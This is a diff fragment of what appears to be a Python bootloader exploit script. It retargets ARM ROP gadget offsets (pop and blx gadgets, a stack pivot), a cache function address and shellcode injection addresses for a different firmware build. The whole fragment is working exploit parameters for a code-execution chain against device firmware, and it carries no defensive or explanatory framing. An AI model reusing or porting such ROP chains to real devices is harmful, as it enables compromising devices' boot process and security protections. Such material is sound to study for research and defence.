@@ -5,18 +5,18 @@ import struct
 base = 0x4BD00000
 forced_addr = 0x45000000
 
-# 5f53e:       bd0b            pop     {r0, r1, r3, pc}
-pop_r0_r1_r3_pc = base + 0x5f53e|1
+# 72a5e:       bd0b            pop     {r0, r1, r3, pc}
+pop_r0_r1_r3_pc = base + 0x72a5e|1
 
-# 2a6ec:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
-pop_pc = base + 0x2a6ec
+# 3c750:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
+pop_pc = base + 0x3c750
 
-# 1ac:       4798            blx     r3 ;  pop     {r3, pc}
-blx_r3_pop_r3 = base + 0x1ac|1
+# 150:       4798            blx     r3 ;  pop     {r3, pc}
+blx_r3_pop_r3 = base + 0x150|1
 
-cache_func = base + 0x2A6DC
+cache_func = base + 0x3C740
 
-test = base + 0x1C3 # prints "Error, the pointer of pidme_data is NULL."
+test = base + 0x185 # prints "Error, the pointer of pidme_data is NULL."
 
 shellcode_sz = 0x1000 # TODO: check size
 
@@ -28,10 +28,10 @@ inject_offset = lk_offset - shellcode_sz - 0x100
 inject_addr = forced_addr + inject_offset + 0x10
 shellcode_addr = forced_addr + inject_offset + 0x100
 
-# 42120:       e913e7cd        ldmdb   r3, {r0, r2, r3, r6, r7, r8, r9, sl, sp, lr, pc}
-pivot = base + 0x42120;
+# 577f0:       e913e7cd        ldmdb   r3, {r0, r2, r3, r6, r7, r8, r9, sl, sp, lr, pc}
+pivot = base + 0x577f0
 
-ptr_offset = 0x3DC
+ptr_offset = 0x3C0
 
 r3_pc = base + (ptr_offset - 0x18) 
 ptr_pc = base + (ptr_offset - 0x08)
